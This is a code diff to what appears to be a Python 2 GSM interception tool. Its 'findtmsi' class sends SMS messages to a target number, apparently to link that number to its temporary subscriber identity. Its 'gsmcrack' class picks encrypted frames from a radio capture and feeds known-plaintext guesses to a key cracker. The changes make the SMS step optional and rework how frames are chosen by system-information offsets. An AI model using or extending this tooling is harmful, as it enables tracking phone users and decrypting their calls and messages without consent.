@@ -11,6 +11,9 @@ import os, fcntl, fcntl, termios, termios
 import operator
 import heapq
 import time
+import argparse
+import termcolor
+import serial
 
 from lxml import etree
 from lxml import objectify
@@ -222,8 +225,9 @@ class findtmsi(object):
                 timeout=400)
 
         #Let's send first sms
-        sms_process= Process(target=self.sms_sender.send, args=(self.number,))
-        sms_process.start()
+        if self.sms_sender:
+            sms_process= Process(target=self.sms_sender.send, args=(self.number,))
+            sms_process.start()
 
         #Last time that sms was sent
         last_time= time.localtime()
@@ -329,6 +333,10 @@ class gsmcrack(object):
 
         frames= self.data.xpath("/scan/frame[@cipher='1']")
         print "Cracking %d encripted frames." % (len(frames),)
+        sys_info= self.data.xpath("/scan/frame/system_information")[0].getparent()
+
+        cframe=None
+        cfn=0
 
         with open(PredictFile) as f:
                 fcontent = "".join( f.readlines() )
@@ -337,23 +345,31 @@ class gsmcrack(object):
                 print "We are guessing:\n", "\n".join(content)
 
                 for (i,line) in enumerate(content):
-                    print "Trying frame no %d" % (i,)
-                    if "skip" in line:
-                        print "Skipping frame"
-                        continue
+                    (method, offset, data)= line.split()
+                    print "Trying frame with offset %s based on method %s" % (offset, method)
 
-                    print "Frame is uplink? %s" % (frames[i].attrib["uplink"],)
+                    if "sys" in method:
+                        cfn= int(sys_info.xpath("burst")[-1].attrib["fn"])+int(offset)
+                        if "none" in data:
+                            data=sys_info.xpath("data")[0].text.strip()
+                        cframe= self.data.xpath("/scan/frame/burst[@fn="+str(cfn)+"]")[0].getparent()
 
-                    if int(frames[i].attrib["uplink"]) and not uplink:
+                    if "offset" in method:
+                        cframe= frames[int(offset)]
+                        cfn= int(offset)
+
+                    print "Frame is uplink? %s" % (cframe.attrib["uplink"],)
+
+                    if int(cframe.attrib["uplink"]) and not uplink:
                         print "No uplink so we are skipping"
                         continue
 
-                    if not int(frames[i].attrib["uplink"]) and not downlink:
+                    if not int(cframe.attrib["uplink"]) and not downlink:
                         print "No downlink so we are skipping"
                         continue
 
-                    print "Cracking frame %d with data %s" % (i, line)
-                    result= self.CrackFrame( frames[i], line.replace(' ','').strip() )
+                    print "Cracking frame %d with data %s" % (cfn, data)
+                    result= self.CrackFrame( cframe, data.strip() )
                     if result:
                         return result
 
@@ -472,7 +488,7 @@ class gsmcrack(object):
                        'Found\s+([0-9abcdef]+)\s+@\s+([0-9]+)\s+#([0-9]+)',
                        'crack\s+#([0-9]+)\s+took\s+([0-9]+)\s+msec',
                        'Cracking\s+#([0-9]+)\s+([01]+)',
-                      ], 400)
+                      ], 300)
             except:
                 break
 
